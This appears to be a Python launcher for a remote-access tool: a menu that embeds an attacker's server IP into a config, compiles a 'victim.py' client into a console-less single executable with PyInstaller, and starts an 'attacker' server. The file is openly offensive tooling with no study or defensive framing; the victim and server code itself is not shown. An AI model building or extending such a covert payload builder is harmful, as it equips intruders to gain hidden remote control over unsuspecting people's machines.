import json
import platform
import subprocess
from attacker import Server

print(
    r"""
        ___         _______      ______      _______      ________     ________             _______    __     __     __
       / _ \       /  _____|    /  ____|    |   ____|    /   _____|    /  ______|           /  ______|  |  |   |  |___  |  |
      / /_\ \     |  |         |  |         |  |__       |  |_____     |  |_____             |  |         _|  |_  |   ___| |  |
     /  ___  \    |  |         |  |         |   __|       \____   \     \____   \            |  |         |_   _| |  /     |  |
    /  /   \  \   |  |_____    |  |_____    |  |____    _____|   |    _____|   |  |  ______   |  |______    |  |   |  |     |  |
   /__/     \__\   \_______|    \______|    |_______|  |________/    |_______/    \________|   |__|   |__|    |__|
"""
)

while True:
  print("[1] Create payload \n[2] Start server\n[3] Exit")

  command = input("Enter your command no. : ")

  if command == "1":
    print("""
    [+] Client Builder Started

    [+] Step 1: Collecting configuration
    [+] Step 2: Embedding server IP
    [+] Step 3: Generating executable
    [+] Step 4: Finalizing build

    ====================================
    """)

    ip = input("Enter server ip : ")

    if ip == "exit":
      continue

    with open("client_config.json", "r") as f:
      data = json.load(f)

    data["host_ip"] = ip

    with open("client_config.json", "w") as f:
      json.dump(data, f, indent=4)

    # Determine OS-specific separator for PyInstaller --add-data
    separator = ";" if platform.system() == "Windows" else ":"
    add_data_arg = f"client_config.json{separator}."

    subprocess.run([
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--distpath",
        ".",
        "--add-data",
        add_data_arg,
        "victim.py",
    ])

    # OS-specific cleanup commands
    if platform.system() == "Windows":
      subprocess.run("rmdir /s /q build", shell=True)
      subprocess.run("del victim.spec", shell=True)
    else:
      subprocess.run("rm -rf build", shell=True)
      subprocess.run("rm victim.spec", shell=True)

  elif command == "2":
    server = Server()
    server.run()
  elif command == "3":
    print("programme closed...")
    break
  else:
    print("Invalid Command...")
